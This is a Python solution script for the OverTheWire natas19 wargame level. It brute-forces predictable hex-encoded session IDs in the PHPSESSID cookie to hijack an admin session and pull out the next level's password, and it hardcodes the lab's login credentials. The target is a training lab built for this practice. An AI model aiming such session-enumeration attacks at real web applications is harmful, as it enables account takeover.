import re
from base64 import b64encode
from builtins import str
from time import sleep

import requests

idx = 0
pw = ''
url = 'http://natas19.natas.labs.overthewire.org/index.php?debug'
userAndPass = b64encode(b"natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs").decode("ascii")
headers = {'Authorization': 'Basic %s' % userAndPass}


def injectCookie(username, sessionid):
    cookie_sessionid = str(sessionid)+'-'+username
    cookie_sessionid = cookie_sessionid.encode('utf-8').hex()
    print("sending %s" % cookie_sessionid)
    res = requests.get(url, headers=headers, cookies={'PHPSESSID': cookie_sessionid })
    return res

def createCookie(username):
    res = requests.post(url, headers=headers, data={'username': username, 'password': 1})
    return res

while idx < 640:
    idx += 1
    print("looking for %i" % idx)

    resp = injectCookie('natas19', idx)
    matches = [line for line in resp.text.splitlines() if re.search(r'Password: ', line)]
    if matches:
        print(matches)
    # OR
    #resp = createCookie('admin')
    #val = resp.cookies['PHPSESSID']
    #print("hex: %s, dec: %s" % (val, bytes.fromhex(val).decode('utf-8')))

    sleep(0.3)

# generated session id
# 3439352d6e617461733139
# xxd -p -r <(echo 3439352d6e617461733139)
# => 495-natas19
